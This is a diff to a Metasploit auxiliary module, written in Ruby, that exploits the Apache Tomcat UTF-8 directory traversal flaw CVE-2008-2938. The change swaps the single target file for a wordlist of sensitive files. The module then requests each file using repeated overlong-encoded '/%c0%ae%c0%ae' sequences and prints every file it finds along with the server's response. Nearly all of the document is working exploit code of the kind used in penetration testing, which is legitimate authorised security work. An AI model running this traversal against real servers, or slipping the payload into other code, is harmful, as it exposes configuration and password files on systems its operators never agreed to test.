@@ -30,7 +30,7 @@ class Metasploit3 < Msf::Auxiliary
 				use Java versions prior to Sun 1.4.2_19, 1.5.0_17, 6u11 - or prior IBM Java
 				5.0 SR9, 1.4.2 SR13, SE 6 SR4 releases. This module has only been tested against
 				RedHat 9 running Tomcat 6.0.16 and Sun JRE 1.5.0-05. You may wish to change
-				FILE (e.g. passwd or hosts), MAXDIRS and RPORT depending on your environment.
+				FILE (hosts,sensitive files), MAXDIRS and RPORT depending on your environment.
 				},
 			'References'  =>
 				[
@@ -39,21 +39,54 @@ class Metasploit3 < Msf::Auxiliary
 					[ 'CVE', '2008-2938' ],
 					[ 'URL', 'http://www.securityfocus.com/archive/1/499926' ],
 				],
-			'Author'      => [ 'patrick' ],
+			'Author'      => [ 'patrick','guerrino <ruggine> di massa' ],
 			'License'     => MSF_LICENSE
 		)
 
 		register_options(
 			[
 				Opt::RPORT(8080),
-				OptString.new('FILE', [ true, 'The file to traverse for', '/conf/server.xml']),
+				OptPath.new('SENSITIVE_FILES',  [ true, "File containing senstive files, one per line",
+					File.join(Msf::Config.install_root, "data", "wordlists", "sensitive_files.txt") ]),
 				OptInt.new('MAXDIRS', [ true, 'The maximum directory depth to search', 7]),
 			], self.class)
 	end
 
-	def run_host(ip)
+	def extract_words(wordfile)
+		return [] unless wordfile && File.readable?(wordfile)
+		begin
+			words = File.open(wordfile, "rb") do |f|
+				f.read
+			end
+		rescue
+			return []
+		end
+		save_array = words.split(/\r?\n/)
+		return save_array
+	end
 
+	def find_files(files)
 		traversal = '/%c0%ae%c0%ae'
+
+		1.upto(datastore['MAXDIRS']) do |level|
+			try = traversal * level
+			res = send_request_raw(
+				{
+					'method'  => 'GET',
+					'uri'     => try + files,
+					}, 25)
+			if (res and res.code == 200)
+				print_status("Request ##{level} may have succeeded on #{rhost}:#{rport}:file->#{files}! Response: \r\n#{res.body}")
+				@files_found << files	
+				break
+			elsif (res and res.code)
+				print_error("Attempt ##{level} returned HTTP error #{res.code} on #{rhost}:#{rport}:file->#{files}")
+			end
+		end
+	end
+
+	def run_host(ip)
+		@files_found = []
 
 		begin
 			print_status("Attempting to connect to #{rhost}:#{rport}")
@@ -64,28 +97,23 @@ class Metasploit3 < Msf::Auxiliary
 				}, 25)
 
 			if (res)
-
-			1.upto(datastore['MAXDIRS']) do |level|
-				try = traversal * level
-				res = send_request_raw(
-					{
-						'method'  => 'GET',
-						'uri'     => try + datastore['FILE'],
-					}, 25)
-				if (res and res.code == 200)
-
-					print_status("Request ##{level} may have succeeded on #{rhost}:#{rport}! Response: \r\n#{res.body}")
-					break
-				elsif (res and res.code)
-					print_error("Attempt ##{level} returned HTTP error #{res.code} on #{rhost}:#{rport}")
+				extract_words(datastore['SENSITIVE_FILES']).each do |files|
+					find_files(files) unless files.empty?
 				end
 			end
 
+			if not @files_found.empty?
+				print_good("File(s) found:")
 
-		end
+				@files_found.each do |f|
+					print_good("#{f}")
+				end
+			else
+				print_good("No File(s) found") 
+			end
+
 		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
 		rescue ::Timeout::Error, ::Errno::EPIPE
-
 		end
 	end
 end
